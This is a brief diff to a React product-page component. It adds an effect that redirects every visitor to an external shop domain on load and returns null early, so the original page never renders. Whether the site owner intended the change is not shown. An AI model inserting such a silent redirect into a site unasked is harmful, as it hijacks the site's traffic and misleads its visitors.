@@ -157,6 +157,10 @@ const FAQS = [
 ];
 
 function Index() {
+  useEffect(() => {
+    window.location.replace("https://cintaslimbelly.tiikshop.online");
+  }, []);
+  return null;
   const [mainImg, setMainImg] = useState(0);
   const [colors, setColors] = useState<number[]>([0]);
   const [sizes, setSizes] = useState<number[]>([1]);
